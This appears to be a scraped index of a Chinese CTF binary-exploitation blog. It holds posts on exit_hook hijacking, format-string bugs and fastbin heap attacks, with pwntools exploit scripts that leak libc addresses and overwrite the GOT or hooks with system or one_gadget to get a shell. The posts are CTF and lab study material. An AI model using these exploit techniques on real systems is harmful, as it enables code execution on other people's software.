\\n&#x27;, b&#x27;1234567890\\x00&#x27;)one_gadgets= [0xe6c7e,0xe6c81,0xe6c84]add(0x420,b&#x27;aaaa&#x27;) #0add(0x10,b&#x27;aaaa&#x27;) #1delete(0)check()  #leak_libclibc_base = u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;)) - 0x1ebbe0#debug4offsetsuccess(&#x27;libc_base:%s&#x27;,libc_base)free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]sys_addr=libc_base+libc.sym[&#x27;system&#x27;]bin_sh=libc_base+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))one_gadget = libc_base + 0xe6c7e#debug()login()p.sendlineafter(b&#x27;name: \\n&#x27;, b&#x27;%7$p&#x27;)p.recvuntil(b&#x27;0x&#x27;)stack = int(p.recv(12), 16) #leak_stack#success(&#x27;stack:%s&#x27;,hex(stack))exit_hook = libc_base + 0x222060 + 3848 #exit_hook#success(&#x27;exit_hook:%s&#x27;,hex(exit_hook))p.sendlineafter(b&#x27;&gt;&gt; \\n&#x27;, b&#x27;2&#x27;)p.sendafter(b&#x27;WRITE MODE: \\n&#x27;, p64(exit_hook))sleep(1)p.sendline(p64(one_gadget))#pause()success(&#x27;libc_base:%s&#x27;,libc_base)success(&#x27;sys_addr:%s&#x27;,hex(sys_addr))success(&#x27;bin_sh:%s&#x27;,hex(bin_sh))success(&#x27;one_gadget:%s&#x27;,hex(one_gadget))success(&#x27;stack:%s&#x27;,hex(stack))success(&#x27;exit_hook:%s&#x27;,hex(exit_hook))p.interactive()\n","categories":["wp"]},{"title":"exit_hook","url":"/2023/09/06/exit-hook/","content":"//gcc exit.c -g -no-pie -o exit#include&lt;stdio.h&gt;void main()&#123;\tprintf(&quot;str1k3\\n&quot;);\texit(0); &#125;\nçœ‹çœ‹exit\nâ–º 0x7ffff7e08a40 &lt;exit&gt;         endbr64    0x7ffff7e08a44 &lt;exit+4&gt;       push   rax   0x7ffff7e08a45 &lt;exit+5&gt;       pop    rax   0x7ffff7e08a46 &lt;exit+6&gt;       mov    ecx, 1   0x7ffff7e08a4b &lt;exit+11&gt;      mov    edx, 1   0x7ffff7e08a50 &lt;exit+16&gt;      lea    rsi, [rip + 0x1a5cc1]         &lt;__exit_funcs&gt;   0x7ffff7e08a57 &lt;exit+23&gt;      sub    rsp, 8   0x7ffff7e08a5b &lt;exit+27&gt;      call   __run_exit_handlers                &lt;__run_exit_handlers&gt;\nè·Ÿè¿› __run_exit_handlersçœ‹çœ‹\n  0x7ffff7e0888a &lt;__run_exit_handlers+218&gt;    mov    rdi, qword ptr [rax + 0x20]  0x7ffff7e0888e &lt;__run_exit_handlers+222&gt;    mov    qword ptr [rax + 0x10], 0  0x7ffff7e08896 &lt;__run_exit_handlers+230&gt;    mov    esi, ebp  0x7ffff7e08898 &lt;__run_exit_handlers+232&gt;    ror    rdx, 0x11  0x7ffff7e0889c &lt;__run_exit_handlers+236&gt;    xor    rdx, qword ptr fs:[0x30]â–º 0x7ffff7e088a5 &lt;__run_exit_handlers+245&gt;    call   rdx                           &lt;_dl_fini&gt;\nè°ƒç”¨äº†_dl_finiï¼Œæ¥ç€è·Ÿè¿›\n0x7ffff7fe0dca &lt;_dl_fini+106&gt;    lea    rdi, [rip + 0x1cb97]          &lt;_rtld_global+2312&gt;  0x7ffff7fe0dd1 &lt;_dl_fini+113&gt;    call   qword ptr [rip + 0x1d191]     &lt;rtld_lock_default_lock_recursive&gt;\n0x7ffff7fe103f &lt;_dl_fini+735&gt;    cmovne rdi, r13   0x7ffff7fe1043 &lt;_dl_fini+739&gt;    jmp    _dl_fini+366                &lt;_dl_fini+366&gt;    â†“   0x7ffff7fe0ece &lt;_dl_fini+366&gt;    xor    edx, edx   0x7ffff7fe0ed0 &lt;_dl_fini+368&gt;    mov    ecx, 1   0x7ffff7fe0ed5 &lt;_dl_fini+373&gt;    call   _dl_sort_maps                &lt;_dl_sort_maps&gt;  â–º 0x7ffff7fe0eda &lt;_dl_fini+378&gt;    lea    rdi, [rip + 0x1ca87]          &lt;_rtld_global+2312&gt;   0x7ffff7fe0ee1 &lt;_dl_fini+385&gt;    call   qword ptr [rip + 0x1d089]     &lt;rtld_lock_default_unlock_recursive&gt;\nvoid_dl_fini (void)&#123;  /* Lots of fun ahead.  We have to call the destructors for all still     loaded objects, in all namespaces.  The problem is that the ELF     specification now demands that dependencies between the modules     are taken into account.  I.e., the destructor for a module is     called before the ones for any of its dependencies.     To make things more complicated, we cannot simply use the reverse     order of the constructors.  Since the user might have loaded objects     using `dlopen&#x27; there are possibly several other modules with its     dependencies to be taken into account.  Therefore we have to start     determining the order of the modules once again from the beginning.  */  /* We run the destructors of the main namespaces last.  As for the     other namespaces, we pick run the destructors in them in reverse     order of the namespace ID.  */#ifdef SHARED  int do_audit = 0; again:#endif  for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)    &#123;      /* Protect against concurrent loads and unloads.  */      __rtld_lock_lock_recursive (GL(dl_load_lock));      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;      /* No need to do anything for empty namespaces or those used for\t auditing DSOs.  */      if (nloaded == 0#ifdef SHARED\t  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit#endif\t  )\t__rtld_lock_unlock_recursive (GL(dl_load_lock));    &#125;&#125;\næ”¾ä¸€ä¸‹è¿™ä¸¤å‡½æ•°çš„å®šä¹‰\n# define __rtld_lock_lock_recursive(NAME) \\  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)# define __rtld_lock_unlock_recursive(NAME) \\  GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)#else# define __rtld_lock_lock_recursive(NAME) \\  __libc_maybe_call (__pthread_mutex_lock, (&amp;(NAME).mutex), 0)# define __rtld_lock_unlock_recursive(NAME) \\  __libc_maybe_call (__pthread_mutex_unlock, (&amp;(NAME).mutex), 0)#endif\ngdbè¾“å…¥p _rtld_globalå¯ä»¥çœ‹åˆ°ç»“æ„ä½“_rtld_global\n_dl_rtld_lock_recursive = 0x7ffff7fd0150 &lt;rtld_lock_default_lock_recursive&gt;,_dl_rtld_unlock_recursive = 0x7ffff7fd0160 &lt;rtld_lock_default_unlock_recursive&gt;,\nè¿™ä¿©å‡½æ•°æ˜¯ç»“æ„ä½“_rtld_globalçš„ä¸€éƒ¨åˆ† å­˜åœ¨äº_dl_load_lock é‡Œï¼Œæ˜¯ _rtld_global._dl_load_lock.mutex.__sizeçš„åœ°å€å¹¶ä¸”åœ¨è°ƒç”¨ä¹‹å‰ä¼šæŠŠæŸä¸ªåœ°å€é‡Œçš„å€¼èµ‹ç»™ rdiã€‚ç”±äº__rtld_lock_unlock_recursiveå­˜æ”¾åœ¨ç»“æ„ä½“ç©ºé—´ï¼Œä¸ºå¯è¯»å¯å†™ï¼Œé‚£ä¹ˆå¦‚æœå¯ä»¥ä¿®æ”¹__rtld_lock_unlock_recursive,å°±å¯ä»¥åœ¨è°ƒç”¨exit()æ—¶åŠ«æŒç¨‹åºæµã€‚_rtld_lock_lock_recursiveä¹Ÿæ˜¯ä¸€æ ·çš„æµç¨‹\n//åœ¨libc-2.23ä¸­exit_hook = libc_base+0x5f0040+3848exit_hook = libc_base+0x5f0040+3856//åœ¨libc-2.27ä¸­exit_hook = libc_base+0x619060+3840exit_hook = libc_base+0x619060+3848//libc-2.31exit_hook = libc_base + 0x222060 + 3848\n\nè¿™æ ·ä¸€æ¥ï¼Œåªè¦çŸ¥é“libcç‰ˆæœ¬å’Œä»»æ„åœ°å€çš„å†™ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™è¿™ä¸ªæŒ‡é’ˆï¼Œæ‰§è¡Œexitåå°±å¯ä»¥åŠ«æŒæ§åˆ¶æµäº†ã€‚\nä»»æ„ä¸€ä¸ªæ”¹å†™æˆone_gadgetéƒ½å¯ä»¥æ‹¿åˆ°shell\næˆ–å°†ä»»æ„ä¸€ä¸ªæ”¹ä¸ºsystemï¼Œå°†_rtld_global._dl_load_lock.mutex.__sizeæ”¹ä¸º&#x2F;bin&#x2F;sh\\x00ä¹Ÿå¯\n","categories":["heap"],"tags":["hook"]},{"title":"disappear","url":"/2024/07/18/disappear/","content":"äº”æœˆåæ–­æ›´äº†ä¸€ä¸ªå¤šæœˆï¼Œéƒ½åœ¨å¹²å˜›ï¼Ÿ\nå¹¿ä¸œçœèµ›2024\nä»åˆèµ›å¼€å§‹å°±æŠ½è±¡çš„æ¯”èµ›ï¼Œç¾¤é‡Œçš„å’Œèµ›äº‹å®‰æ’çš„æŠ½è±¡å°±ä¸è°ˆäº†\n","tags":["å‘ç”µ"]},{"title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´","url":"/2023/08/01/fmt/","content":"åœ¨ä½ çš„å†…å­˜åˆ»ä¸Šå¥‡æ€ªçš„ç¬¦å·\nå‡½æ•°åŸå‹printf (â€œæ ¼å¼åŒ–å­—ç¬¦ä¸²â€,å‚é‡â€¦ )å‡½æ•°çš„è¿”å›å€¼æ˜¯æ­£ç¡®è¾“å‡ºçš„å­—ç¬¦çš„ä¸ªæ•°ï¼Œå¦‚æœè¾“å‡ºå¤±è´¥ï¼Œè¿”å›è´Ÿå€¼ã€‚å‚é‡è¡¨ä¸­å‚æ•°çš„ä¸ªæ•°æ˜¯ä¸å®šçš„ï¼ˆå¦‚ä½•å®ç°å‚æ•°çš„ä¸ªæ•°ä¸å®šï¼Œå¯ä»¥å‚è€ƒã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹è¿™æœ¬ä¹¦ï¼‰ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªï¼Œå¯ä»¥æ˜¯ä¸¤ä¸ªï¼Œä¸‰ä¸ªâ€¦ï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰å‚æ•°ã€‚printfå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å¸¸è§çš„æœ‰ %dï¼Œ%fï¼Œ%cï¼Œ%sï¼Œ%xï¼ˆè¾“å‡º16è¿›åˆ¶æ•°ï¼Œå‰é¢æ²¡æœ‰0xï¼‰ï¼Œ%pï¼ˆè¾“å‡º16è¿›åˆ¶æ•°ï¼Œå‰é¢å¸¦æœ‰0xï¼‰ç­‰ç­‰ã€‚ä½†æ˜¯æœ‰ä¸ªä¸å¸¸è§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸² %n ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯å°†%nä¹‹å‰æ‰“å°å‡ºæ¥çš„å­—ç¬¦ä¸ªæ•°ï¼Œèµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ã€‚\né™¤äº†%n,è¿˜æœ‰%hnï¼Œ%hhnï¼Œ%llnï¼Œåˆ†åˆ«ä¸ºå†™å…¥ç›®æ ‡ç©ºé—´2å­—èŠ‚ï¼Œ1å­—èŠ‚ï¼Œ8å­—èŠ‚ã€‚ æ³¨æ„æ˜¯å¯¹åº”å‚æ•°ï¼ˆè¿™ä¸ªå‚æ•°æ˜¯æŒ‡é’ˆï¼‰çš„å¯¹åº”çš„åœ°å€å¼€å§‹èµ·å‡ ä¸ªå­—èŠ‚ã€‚ä¸è¦è§‰å¾—%llnï¼Œå–çš„æ˜¯8ä¸ªå­—èŠ‚çš„æŒ‡é’ˆï¼Œ%nå–çš„å°±æ˜¯4ä¸ªå­—èŠ‚çš„æŒ‡é’ˆï¼Œå–çš„æ˜¯å¤šå°‘å­—èŠ‚çš„æŒ‡é’ˆåªè·Ÿç¨‹åºçš„ä½æ•°æœ‰å…³ï¼Œå¦‚æœæ˜¯32ä½çš„ç¨‹åºï¼Œ%nå–çš„å°±æ˜¯4å­—èŠ‚æŒ‡é’ˆï¼Œ64ä½å–çš„å°±æ˜¯8å­—èŠ‚æŒ‡é’ˆï¼Œè¿™æ˜¯å› ä¸ºä¸åŒä½æ•°çš„ç¨‹åºï¼Œæ¯ä¸ªå‚æ•°å¯¹åº”çš„å­—èŠ‚æ•°æ˜¯ä¸åŒçš„ã€‚æ¥ä¸‹æ¥å†™ä¸ªç¨‹åºçœ‹çœ‹\n//gcc -no-pie test.c -fno-stack-protector  -z execstack -o test#include &lt;stdio.h&gt;int d = 1;   //fmt1char x[] =&quot;/bin/sh&quot;int main()&#123;  int n=0;  printf(&quot;aaaaa%n\\n&quot;,&amp;n);  printf(&quot;%d\\n&quot;,n);\t\t  \t  int a=114;  printf(&quot;%d\\n&quot;,a);    char b[]=&quot;str1k3&quot;;  printf(b);  printf(&quot;\\n&quot;);    char c[256];  read(0,c,0x64);  //fmt  printf(c);  puts(x);    //fmt2  if(d==0)  &#123;   backdoor();  &#125;  return 0;&#125;int backdoor()&#123; return system(&quot;/bin/sh&quot;);&#125;\n\nStarting program: /home/str1k3/Desktop/test aaaaa5114str1k3aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaaaaaa-0xa-(nil)-(nil)-0xa-0x7c-0x6161616161616161-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x7025-0x401090-0x336b3172747320[Inferior 1 (process 14255) exited normally]\nå¦‚æœæˆ‘ä»¬åªä¼ å…¥äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²è€Œæ²¡æœ‰ä¼ å…¥å‚æ•°\né‚£ä¹ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²ä»ç„¶ä¼šéµå¾ªç€åŸå…ˆçš„é€»è¾‘ï¼Œå‘é«˜åœ°å€å¤„é€ä¸ªå­—é•¿çš„è¾“å‡ºå½“å‰æ ˆçš„å†…å®¹&#x2F;æŒ‡é’ˆ(è¾“å‡ºçš„æ–¹å¼æ ¹æ®å…¶æ ¼å¼åŒ–å­—ç¬¦çš„ä¸åŒè€Œä¸åŒ)\nè¿™æ˜¯å› ä¸ºprintfå‡½æ•°å¹¶ä¸çŸ¥é“å‚æ•°ä¸ªæ•°ï¼Œå®ƒçš„å†…éƒ¨æœ‰ä¸ªæŒ‡é’ˆï¼Œç”¨æ¥ç´¢æ£€æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚å¯¹äºç‰¹å®šç±»å‹%ï¼Œå°±å»å–ç›¸åº”å‚æ•°çš„å€¼ï¼Œç›´åˆ°ç´¢æ£€åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»“æŸ\npwntoolså·²é›†æˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ”»å‡»æ–¹å¼\nfrom pwn import *p = process(&#x27;./test&#x27;)elf =ELF(&#x27;./test&#x27;)context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)def fmt1():  p.recv()  payload=fmtstr_payload(6,&#123;0x404048:0&#125;)    #æŠŠdæ”¹ä¸º0  p.sendline(payload)  p.interactive()def fmt2():  p.recv()  payload=fmtstr_payload(6,&#123;elf.got[&#x27;puts&#x27;]:elf.plt[&#x27;system&#x27;]&#125;) #æŠŠreadæ”¹ä¸ºsystemï¼Œæ‰§è¡Œ/bin/sh  p.sendline(payload)  p.interactive()#fmt1()fmt2()\nä¸‹é¢æ”¾ä¸€é“ç»¼åˆä¸€ç‚¹çš„é¢˜[SWPUCTF 2021 æ–°ç”Ÿèµ›]NSS_printer_Ichecksec\n[*] &#x27;/home/str1k3/.cache/vmware/drag_and_drop/3CJjqN/NSS_printer&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char buf[104]; // [rsp+0h] [rbp-70h] BYREF  unsigned __int64 v4; // [rsp+68h] [rbp-8h]  v4 = __readfsqword(0x28u);  init();  while ( 1 )  &#123;    puts(&quot;======================================&quot;);    puts(&quot;=====welcone to use NSS printer!======&quot;);    printf(&quot;input what you want to say: &quot;);    read(0, buf, 0x64uLL);    printf(&quot;you said:&quot;);    printf(buf);  &#125;&#125;\n\nä¿æŠ¤å…¨å¼€ã€‚å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè€ƒè™‘å†…å­˜ä»»æ„å†™æ”¹gotè¡¨ã€‚å¼€äº†pieï¼Œå¯åˆ©ç”¨åœ°å€ç›¸å¯¹ä½ç½®ä¸å˜ï¼Œåœ°å€åä¸‰ä½ä¸å˜çš„ç‰¹æ€§ç»•è¿‡ã€‚æœ€ç»ˆæƒ³æ³•æ˜¯æŠŠprintfæ”¹æˆsystemï¼Œç„¶åé€šè¿‡æ‰‹åŠ¨è¾“å…¥&#x2F;bin&#x2F;shæ¥æ‹¿åˆ°shell\nç”¨ä¸Šæ–‡çš„æµ‹è¯•æ–¹å¼ï¼šaaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%på¯è°ƒè¯•å¾—ï¼šåç§»ï¼š611ï¼ˆ_startï¼‰+ 6 &#x3D; 17   #æœ‰äº›å¸ˆå‚…ç”¨çš„è¿™ä¸ªæ¥ç®—åŸºå€13ï¼ˆcanaryï¼‰+ 6ï¼ˆåç§»ï¼‰ &#x3D; 19ï¼ˆçœŸå®åœ°å€ï¼‰15ï¼ˆ__libc_start_mainï¼‰+6ï¼ˆåç§»ï¼‰ &#x3D; 21ï¼ˆçœŸå®åœ°å€ï¼‰19ï¼ˆmainï¼‰+6ï¼ˆåç§»ï¼‰ &#x3D; 25ï¼ˆçœŸå®åœ°å€ï¼‰\nfrom LibcSearcher import *from pwn import*context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&#x27;./NSS_printer&#x27;)#p = remote(&#x27;node1.anna.nssctf.cn&#x27;, 28831)elf = ELF(&#x27;./NSS_printer&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)payload1 = &quot;%19$p..%21$p-%25$p&quot;p.recvuntil(&quot;input what you want to say: &quot;)p.sendline(payload1)p.recvuntil(&#x27;you said:&#x27;)canary = int(p.recv(18),16)print(&#x27;canary_addr&#x27;,hex(canary))p.recvuntil(&#x27;..&#x27;)libc_start_main = int(p.recv(14),16)-240print(&#x27;libc_start_main&#x27;,hex(libc_start_main))p.recvuntil(&#x27;-&#x27;)elf_base = int(p.recv(14),16)-0xA14  #mainå‡½æ•°çš„åç§»printf_addr = elf_base+elf.got[&#x27;printf&#x27;]print(&#x27;elf_base&#x27;,hex(elf_base))print(&#x27;printf_addr&#x27;,hex(printf_addr))libc = LibcSearcher(&#x27;__libc_start_main&#x27;,libc_start_main)libc_base = libc_start_main - libc.dump(&quot;__libc_start_main&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)bin_addr =  libc_base + libc.dump(&quot;str_bin_sh&quot;)print(&#x27;libc_start_main:&#x27;,hex(libc_start_main))print(&#x27;libc_base:&#x27;,hex(libc_base))print(&#x27;system_addr:&#x27;,hex(system_addr))print(&#x27;bin_addr:&#x27;,hex(bin_addr))payload = fmtstr_payload(6,&#123;printf_addr:system_addr&#125;,write_size=&#x27;short&#x27;)print(len(payload))p.recvuntil(&quot;input what you want to say: &quot;)p.sendline(payload)p.sendline(b&#x27;/bin/sh\\x00&#x27;)p.interactive()\n\n\n\n","categories":["stack"],"tags":["fmt"]},{"title":"fastbin_attack","url":"/2023/09/01/fastbin-attack/","content":"fastbinfast_binçš„èŒƒå›´:64ä½æœºå™¨ä¸‹å±äºfast_binçš„chunkå¤§å°åœ¨0x20 â€“ 0x80ä¹‹é—´ï¼Œæ¯ä¸ªbiné“¾è¡¨ä¹‹é—´ä»¥0x10å­—èŠ‚é€’å¢ï¼Œå…±è®¡7æ¡biné“¾ï¼›32ä½æœºå™¨ä¸‹ä¸º0x10 â€“ 0x40ï¼Œæ¯ä¸ªbiné“¾è¡¨ä¹‹é—´ä»¥0x8å­—èŠ‚é€’å¢ï¼Œå…±è®¡7æ¡ã€‚æ³¨æ„ï¼Œä¸Šé¢çš„å¤§å°å‡æ˜¯åŒ…å«äº†chunkå¤´çš„.\næ¯ä¸ªbinæ˜¯ä¸€ä¸ªå•é“¾è¡¨ï¼Œå…ˆè¿›åå‡ºï¼Œæ‰€ä»¥åœ¨fast binä¸­åªæœ‰fdæŒ‡é’ˆä¼šè¢«ä½¿ç”¨ã€‚\nfastbinè®¾è®¡çš„åˆè¡·æ˜¯ä¸ºäº†æ–¹ä¾¿å°å†…å­˜chunkçš„é‡Šæ”¾å’Œé‡æ–°åˆ†é… ä¸ºäº†é˜²æ­¢å’Œç›¸é‚»çš„chunkåˆå¹¶ æ‰€ä»¥ä½äºfastbinä¸­çš„free chunkçš„PREV_INUSEä½ä¸ä¼šè¢«è®¾ç½®ä¸º0 å§‹ç»ˆä¸º1(ä¸ä¼šunlink)\nå­˜æ”¾fastbiné“¾è¡¨çš„æ˜¯malloc_stateç»“æ„ä½“\nstruct malloc_state&#123;  /* Serialize access.  */  __libc_lock_define (, mutex);  /* Flags (formerly in max_fast).  */  int flags;  /* Set if the fastbin chunks contain recently inserted free blocks.  */  /* Note this is a bool but not all targets support atomics on booleans.  */  int have_fastchunks;  /* Fastbins */  mfastbinptr fastbinsY[NFASTBINS];  /* Base of the topmost chunk -- not otherwise kept in a bin */  mchunkptr top;  /* The remainder from the most recent split of a small request */  mchunkptr last_remainder;  /* Normal bins packed as described above */  mchunkptr bins[NBINS * 2 - 2];  /* Bitmap of bins */  unsigned int binmap[BINMAPSIZE];  /* Linked list */  struct malloc_state *next;  /* Linked list for free arenas.  Access to this field is serialized     by free_list_lock in arena.c.  */  struct malloc_state *next_free;  /* Number of threads attached to this arena.  0 if the arena is on     the free list.  Access to this field is serialized by     free_list_lock in arena.c.  */  INTERNAL_SIZE_T attached_threads;  /* Memory allocated from the system in this arena.  */  INTERNAL_SIZE_T system_mem;  INTERNAL_SIZE_T max_system_mem;&#125;;\ndouble_freeglibcå¯¹äºfastbinçš„double_freeæ£€æŸ¥æ˜¯ä¾é äºæ£€æµ‹main_arenaæŒ‡å‘çš„chunkå³ä½äºé“¾è¡¨å¤´çš„chunk å¦‚æœè¦é‡Šæ”¾çš„chunkå’Œä½äºé“¾è¡¨å¤´çš„chunkæ˜¯åŒä¸€ä¸ª é‚£ä¹ˆå°±ä¼šè§¦å‘double freeç»ˆæ­¢è¿›ç¨‹\nif (SINGLE_THREAD_P)      &#123;\t/* Check that the top of the bin is not the record we are going to\t   add (i.e., double free).  */\tif (__builtin_expect (old == p, 0))\t  malloc_printerr (&quot;double free or corruption (fasttop)&quot;);\tp-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);\t*fb = p;      &#125;\n\n\ndebug()add(0x68,b&#x27;aaaa&#x27;)#chunk0add(0x68,b&#x27;aaaa&#x27;)#chunk1add(0x68,b&#x27;aaaa&#x27;)#chunk2for i in range(7):    add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)for i in range(7):    delete(i+3)pause()delete(0)#free chunk0delete(1)#freeæ‰chunk1æ¥å¹²æ‰°é“¾è¡¨ç»“æ„delete(0)#double free chunk0\n\nfree chunk0:\npwndbg&gt; bintcachebins0x70 [  7]: 0x177a650 â€”â–¸ 0x177a5e0 â€”â–¸ 0x177a570 â€”â–¸ 0x177a500 â€”â–¸ 0x177a490 â€”â–¸ 0x177a420 â€”â–¸ 0x177a3b0 â—‚â€” 0x0fastbins0x70: 0x177a250 â—‚â€” 0x0Free chunk (fastbins) | PREV_INUSEAddr: 0x177a250Size: 0x71fd: 0x00\n\nfree chunk1:\nFree chunk (fastbins) | PREV_INUSEAddr: 0x177a250Size: 0x71fd: 0x00Free chunk (fastbins) | PREV_INUSEAddr: 0x177a2c0Size: 0x71fd: 0x177a250fastbins0x70: 0x177a2c0 â€”â–¸ 0x177a250 â—‚â€” 0x0\n\ndouble free chunk0\nfastbins0x70: 0x177a2c0 â€”â–¸ 0x177a250 â—‚â€” 0x177a2c0\nå¯ä»¥çœ‹åˆ°æ­¤æ—¶chunk0æ—¢ä½äºé“¾è¡¨å¤´ä¹Ÿä½äºé“¾è¡¨å°¾\nå¦‚æœæˆ‘ä»¬å†æ¬¡ç”³è¯·ä¸€ä¸ª0x68å¤§å°çš„chunk0 ç”³è¯·åˆ°çš„æ˜¯ä½äºé“¾è¡¨å¤´çš„chunk ä½†æ˜¯æ­¤æ—¶è¿˜æœ‰ä¸€ä¸ªchunk0åœ¨é“¾è¡¨ä¸­\né‚£ä¹ˆæ‰“å°å‡ºè¯¥å †å—ä¾¿å¯åšåˆ°æ³„éœ²heap_base\nåœ¨libc2.23ä¸‹ï¼Œè¿˜æœ‰ä¸€ä¸ªå¸¸è§çš„æ”»å‡»æ‰‹æ³•malloc_hookï¼Œä¹‹åå†å†™\nchunk_extend\n//gcc fastbin_chunk_extend.c -g -no-pie -o fastbin_chunk_extend#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    void *chunk0, *chunk2;\tchunk0 = malloc(0x10);//0x10çš„chunk0\tmalloc(0x10);//0x10çš„chunk1\t\t*(unsigned long *)((unsigned long)chunk0 - 0x8) = 0x41;// edit chunk0çš„sizeåŸŸ\tfree(chunk0);\t\tchunk2 = malloc(0x30);//0x30çš„chunk2 å®ç°extendï¼Œç”¨chunk2æ§åˆ¶äº†chunk1çš„å†…å®¹\t\t    return 0;&#125;\n\næœªä¿®æ”¹å‰çš„chunk0å’Œchunk1\npwndbg&gt; x/20gx 0x4052900x405290:\t0x0000000000000000\t0x00000000000000210x4052a0:\t0x0000000000000000\t0x00000000000000000x4052b0:\t0x0000000000000000\t0x00000000000000210x4052c0:\t0x0000000000000000\t0x0000000000000000\nç¨åç”³è¯·çš„chunk2ï¼Œæ‹¿æäº†chunk1\npwndbg&gt; x/40gx 0x4052900x405290:\t0x0000000000000000\t0x00000000000000410x4052a0:\t0x0000000000000000\t0x00000000000000000x4052b0:\t0x0000000000000000\t0x0000000000000021#chunk1ï¼Œä½†æ˜¯åœ¨chunk2é‡Œ0x4052c0:\t0x0000000000000000\t0x00000000000000000x4052d0:\t0x0000000000000000\t0x0000000000020d310x4052e0:\t0x0000000000000000\t0x00000000000000000x4052f0:\t0x0000000000000000\t0x00000000000000000x405300:\t0x0000000000000000\t0x00000000000000000x405310:\t0x0000000000000000\t0x00000000000000000x405320:\t0x0000000000000000\t0x00000000000000000x405330:\t0x0000000000000000\t0x00000000000000000x405340:\t0x0000000000000000\t0x00000000000000000x405350:\t0x0000000000000000\t0x00000000000000000x405360:\t0x0000000000000000\t0x00000000000000000x405370:\t0x0000000000000000\t0x00000000000000000x405380:\t0x0000000000000000\t0x00000000000000000x405390:\t0x0000000000000000\t0x00000000000000000x4053a0:\t0x0000000000000000\t0x00000000000000000x4053b0:\t0x0000000000000000\t0x00000000000000000x4053c0:\t0x0000000000000000\t0x0000000000000000\n\nfastbin_poisoningè·Ÿtcachebinçš„ç±»ä¼¼\n//gcc fastbin_poisoning.c -g -no-pie -o fastbin_poisoning#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;\t\tunsigned long fck[4];   printf(&quot;stack addr is %p\\n&quot;, fck);   unsigned long *ptr = malloc(0x10);   free(ptr);   fck[1] = 0x21;           // same with 0x20   ptr[0] = (unsigned long)fck; // edit fd pointer   printf(&quot;the original heap %p\\n&quot;, malloc(0x10));   printf(&quot;alloc to the stack %p\\n&quot;, malloc(0x10));    return 0;&#125;\nAllocated chunk | PREV_INUSEAddr: 0x602310Size: 0x21Free chunk (fastbins) | PREV_INUSEAddr: 0x602310Size: 0x21fd: 0x7fffffffe2d0Free chunk (fastbins) | PREV_INUSEAddr: 0x602310Size: 0x21fd: 0x7fffffffe2d0\nè¿™é‡Œå†™å…¥çš„æ˜¯æ ˆä¸Šçš„åœ°å€ï¼Œä¹Ÿå¯ä»¥è€ƒè™‘å†™å…¥bssæ®µæˆ–è€…libcæ®µï¼Œè¦çœ‹å…·ä½“çš„åˆ©ç”¨æ‰‹æ³•\nè¯¥æ”»å‡»æ–¹å¼ä¹Ÿæ˜¯malloc_hookæ”»å‡»çš„å‰ç½®æ‰‹æ®µ\nå‰é¢çš„æ”»å‡»æ‰‹æ®µï¼Œä»¥åå†æ¥æ¢ç´¢å§~\n","categories":["heap"],"tags":["bin"]},{"title":"free_hook","url":"/2023/09/14/free-hook/","content":"free_hookçš„è°ƒç”¨\nvoid (*hook) (void *, const void *)= atomic_forced_read (__free_hook);if (__builtin_expect (hook != NULL, 0))&#123;(*hook)(mem, RETURN_ADDRESS (0));return;&#125;\nå¯¹åº”çš„æ±‡ç¼–ä»£ç \n.text:00000000000736F4                 sub     rsp, 8          ; Alternative name is &#x27;cfree&#x27;.text:00000000000736F8                 mov     rax, cs:__free_hook_ptr.text:00000000000736FF                 mov     rax, [rax].text:0000000000073702                 test    rax, rax.text:0000000000073705                 jz      short loc_73710.text:0000000000073707                 mov     rsi, [rsp+8].text:000000000007370C                 call    rax\nfree_hookçš„å­˜å‚¨çš„ä½ç½®,åœ¨ free_hookä¸Šæ–¹ -0xb58 æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æ»¡è¶³top_chunkè¦æ±‚çš„å¤§å°libc-2.27.so\npwndbg&gt; p &amp;__free_hook$2 = (void (**)(void *, const void *)) 0x7ffff7dcf8e8 &lt;__free_hook&gt;pwndbg&gt; x/8gx 0x7ffff7dcf8e8 - 0xb580x7ffff7dced90 &lt;initial+16&gt;:\t0x0000000000000004\t0x05fc5621ed6fad690x7ffff7dceda0 